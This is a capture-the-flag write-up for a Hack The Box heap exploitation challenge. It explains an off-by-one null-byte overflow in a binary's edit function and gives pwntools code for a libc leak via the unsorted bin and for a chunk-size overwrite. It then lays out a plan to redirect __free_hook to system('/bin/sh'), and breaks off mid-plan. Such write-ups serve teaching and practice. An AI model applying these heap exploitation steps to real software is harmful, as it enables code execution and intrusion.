# Bon-nie-appetit
> Write-up author: jon-brandy

## DESCRIPTION:

<p align="justify">

After the successful hijacking of the D12 spaceship during the Space Pirate mission, 
the crew managed to place a signal transmitter on a vending machine that the Golden Fang's members are using to order 
food from the Supplier Spacecraft of Draeger. Golden Fang's crew's favorite food contains a secret ingredient called "Little Green People0," 
which we do not have further info about. The signal passes through many satellites before it reaches the Supplier, 
so it won't be easy to track the device and the leaked signal. Can you take advantage of it and get control of the Supplier?

</p>

## HINT:
- NONE

## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and not stripped.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/52513364-507f-4862-b911-20fd90a244d5)


> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9cc12335-b63f-4968-9c1e-d12c16e242aa)


2. Decompiling the binary and reviewing the main() function, we can identified that the program has 5 menus.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/468eeb58-9bfa-4497-96ae-95ba613b8973)

#### MENUS:

```
1. Create chunks.
2. Show chunks.
3. Edit chunks.
4. Delete chunks.
5. Terminate program.
```

3. Reviewing the new_order() function, looks no bug resides here. It validates the maximum orders we can allocate is only 20 orders.
4. It accepts 2 datas, those are **size** and **contents**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7cc5f713-f55b-41e9-bfbf-0b224d948926)


5. Reviewing the show_order() function, seems there is no bug again. It accepts index and shows the chunk's content at that index.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/eb40e0bd-0128-478a-86e7-1cff60abc231)


6. Reviewing the edit_order() function, we found a bug. Noticed it uses **strlen()** as the length of our input.
7. Remembering in C there is a NULL BYTE data, hence it's introduces a heap overflow using `OFF-ONE-BYTE` vulnerability.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2d6281b6-0ad8-4a3d-bd92-354364eca94b)


#### NOTES:

```
To trigger the overflow, we just need to fill the content to the fullest of it's size. For example if we edit the size to 0x60,
then we fill the content's up to 0x60, so there is an overflow because of the null-byte after it.

Remembering heap chunks are stored adjacent, if overflow occurs then current chunks will take the next chunk's
size into account. (we can creating a fake size field).
```

8. Next, reviewing the delete_order() function, seems no use after free bug. The freed chunks are set to NULL.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cd398815-7ced-4ef7-96f8-89df916b8f3d)


9. Great! Seems our interest should be at **edit_order()**.
10. Let's leak a libc first by allocate size outside of fastbin range. When the chunk freed, it shall resides at the unsorted bin.
11. To make sure our chunk falls at unsortedbin, let's allocate size in range of largebins.

### LEAK LIBC ADDRESS IN UNSORTED BIN

- To be able for libc address disclosed at the unsorted bins we need to allocate sizes outside the fastbin ranges.
- The simplest method to make sure the chunks are stored in unsorted bins after freed, simply allocate sizes of largebins.
- BUT remember to allocate another chunk after it to prevent consolidation with the top chunk.

> FLOW

```
allocate 0x428 (so the size field is 0x430)
allocate 24 (just to prevent consolidation with the top chunk)
free index 0 (at this phase, libc is shown at the unsorted bins)
free index 1
allocate 0x428
show contents at index 0
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e25ce249-262d-4a0d-8da5-9f8e2de2d456)


12. Great! Now let's unpack and calculate the libc base using **vmmap**.

> SCRIPT

```py
from pwn import *
import os

os.system('clear')

exe = './bon-nie-appetit'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def make(size, data):
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', str(size))
    sh.sendlineafter(b':', data)

def show(index):
    sh.sendlineafter(b'>', b'2')
    sh.sendlineafter(b':', str(index))

def edit(index, data):
    sh.sendlineafter(b'>', b'3')
    sh.sendlineafter(b':', str(index))
    sh.sendlineafter(b':', data)

def delete(index):
    sh.sendlineafter(b'>', b'4')
    sh.sendlineafter(b':', str(index))

def finalize():
    sh.sendlineafter(b'>', b'5') 

sh = start()

# leak libc
make(0x428, b'A') # size field 0x430
make(24, b'B') 
delete(0) # delete chunk idx 0
delete(1) # delete chunk idx 1
make(0x428, b'') 
show(0)

sh.recvuntil(b"=> ")
get = unpack(sh.recv(6) + b'\x00' * 2)
log.info(f'libc leak --> {hex(get)}')

libc.address = get - 4111370
success(f'LIBC BASE --> {hex(libc.address)}')

gdb.attach(sh)
sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fda5a6fd-8953-4acf-a143-eb21162bfe8e)


13. Nice! Now let's move our interest to the **Off-One-Byte (OOB)** bug we found earlier.
14. To make it works, let's delete the chunk at index 0 first, then starts allocating 3 chunks adjacently.
15. To make sure the size fits well for **/bin/sh** strings and **libc.sym.system**, let's allocate for **0x38** --> 0x40 as it's size field.

### EXPLOITING OOB BUG

- So the flow is quite simple here, we need to allocate 3 chunks adjacently.
- Then using the OOB bug to overflow from chunk 0 to it's next chunk (chunk 1), so chunk 1 size_field shallc change to whatever we want, for example we're gonna set the size field to 0x81.

> FLOW

```
delete chunk 0 (we want to remove the previously allocated size which we use to leak the libc address).
allocate 0x38 chunk with contents fills it up. (should be stored at index 0)
allocate 0x38 chunk with contents fills it up. (should be stored at index 1)
allocate 0x38 chunk with contents fills it up. (should be stored at index 2)
edit chunk for index 0 (triggering the OOB bug) --> gonna make a fake size field for chunk 2.
```

> SCRIPT

```py
delete(0) # remove data at chunk 0
make(0x28, b'X' * 0x28) # allocate new data at chunk 0
make(0x28, b'Y' * 0x28) # allocate new data at chunk 1
make(0x28, b'Z' * 0x28) # allocate new data at chunk 2

edit(0, b'M' * 0x28 + p8(0x81)) # overflow chunk 0 until and overlap the size field of chunk 2 to 0x81
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b11603b3-d093-40c0-b157-bf2341766444)


16. Noticed the size field of chunk 1 (is number 2 logically) changed to our preferences.

### OVERLAP FD POINTER TO __FREE_HOOK() and Overwrite it to system()

- In this condition, the bigger chunk (0x81) can be used to overlap the `FD Pointer` of the chunk at index 2 to `__free_hook()`.
- At the process of that overlap, we can specify another fake size field to 0x21, this size_field FD is __free_hook().
- Then we can start allocate /bin/sh strings with size of 0x28 and allocate system() with size of 0x28.
- Finally just free chunk index 0, to trigger system"/bin/sh").

> FLOW

```
delete chunk index 1
delete chunk index 2
allocate 0x78, send pad * 0x28 + pack(0x21) --> for fake size field again + __free_hook() --> for it's FD
```

